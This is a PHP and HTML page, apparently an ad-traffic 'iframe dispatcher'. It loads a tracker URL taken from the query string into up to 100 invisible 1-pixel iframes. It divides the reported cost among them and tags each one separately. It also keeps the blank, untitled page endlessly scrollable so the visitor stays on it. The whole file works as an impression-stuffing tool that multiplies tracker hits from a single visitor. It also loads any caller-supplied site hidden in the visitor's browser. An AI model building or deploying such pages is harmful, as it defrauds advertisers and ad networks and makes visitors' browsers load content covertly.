<?php
// =========================================
// DYNAMIC IFRAME DISPATCHER — index.php
// =========================================

function p($key, $default = '') {
    return isset($_GET[$key]) ? $_GET[$key] : $default;
}

$ctrl_m_total = max(1, min((int) p('ctrl_m', 2), 100));

// Split ?url= at ? to avoid double ? bug
$raw_url      = p('url', '');
$bemob_base   = $raw_url;
$inner_params = [];

if (strpos($raw_url, '?') !== false) {
    list($bemob_base, $inner_qs) = explode('?', $raw_url, 2);
    parse_str($inner_qs, $inner_params);
}

// Build forward params
$skip    = ['ctrl_m', 'url'];
$forward = [];

foreach ($inner_params as $key => $value) {
    if (strpos($key, '-') !== false) continue;
    $forward[$key] = $value;
}
foreach ($_GET as $key => $value) {
    if (in_array($key, $skip)) continue;
    if (strpos($key, '-') !== false) continue;
    $forward[$key] = $value;
}

// ✅ Capture cost BEFORE unsetting it
$real_cost = isset($forward['cost']) ? (float) $forward['cost'] : 0;
unset($forward['isp'], $forward['cost']);

// ✅ Pass $ctrl_m_total and $real_cost as parameters
function buildSrc($bemob_base, $index, $forward, $ctrl_m_total, $real_cost) {
    $params          = $forward;
    $params['cost']  = $ctrl_m_total > 0 ? $real_cost / $ctrl_m_total : 0;
    $params['frm']   = 'iframe-' . $index;
    return $bemob_base . '?' . http_build_query($params);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title></title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body {
      width: 100%;
      background: #ffffff;
      -ms-overflow-style: none;
      scrollbar-width: none;
    }
    html::-webkit-scrollbar,
    body::-webkit-scrollbar { display: none; }
    /* iframes hidden */
    .iDiv iframe {
      border: none;
      width: 1px;
      height: 1px;
      overflow: hidden;
      position: absolute;
      opacity: 0;
      pointer-events: none;
    }

    /* br container — grows on scroll */
    #brContainer {
      display: block;
      width: 1px;
    }
  </style>
</head>
<body>

 

  <!-- This container gets <br> tags injected on scroll -->
  <div id="brContainer">
  <!-- Initial breaks to make page scrollable from the start -->
    <?php echo str_repeat('<br>', 200); ?>
    <!-- Hidden iframes — fire immediately -->
      <div class="iDiv">
        <?php if (!empty($bemob_base)): ?>
          <?php for ($i = 1; $i <= $ctrl_m_total; $i++): ?>
            <iframe
              src="<?php echo htmlspecialchars(
                buildSrc($bemob_base, $i, $forward, $ctrl_m_total, $real_cost),
                ENT_QUOTES, 'UTF-8'
              ); ?>"
              scrolling="no"
              loading="eager">
            </iframe>
          <?php endfor; ?>
        <?php endif; ?>
      </div>
      <!-- Initial breaks to make page scrollable from the start -->
    <?php echo str_repeat('<br>', 200); ?>
  </div>
    
    <script>
      var container  = document.getElementById('brContainer');
      var ticking    = false;
      var THRESHOLD  = 600;
      var ADD_COUNT  = 100;
    
      // Reference to the iDiv so we can insert before/after it
      var iDiv = document.querySelector('.iDiv');
    
      function addBreaks() {
        var scrollTop    = window.scrollY;
        var scrollBottom = window.scrollY + window.innerHeight;
        var docHeight    = document.documentElement.scrollHeight;
    
        // Add <br> BELOW when near bottom
        if (docHeight - scrollBottom < THRESHOLD) {
          var fragBottom = document.createDocumentFragment();
          for (var i = 0; i < ADD_COUNT; i++) {
            fragBottom.appendChild(document.createElement('br'));
          }
          container.appendChild(fragBottom);
        }
    
        // Add <br> ABOVE when near top
        if (scrollTop < THRESHOLD) {
          var fragTop = document.createDocumentFragment();
          for (var i = 0; i < ADD_COUNT; i++) {
            fragTop.appendChild(document.createElement('br'));
          }
          // Insert before the iDiv (above iframes)
          container.insertBefore(fragTop, iDiv);
          // Correct scroll position so page doesn't jump
          window.scrollBy(0, ADD_COUNT * 21); // 21px ≈ avg <br> height
        }
      }
    
      window.addEventListener('scroll', function () {
        if (!ticking) {
          window.requestAnimationFrame(function () {
            addBreaks();
            ticking = false;
          });
          ticking = true;
        }
      }, { passive: true });
    
      addBreaks();
    </script>

</body>
</html>
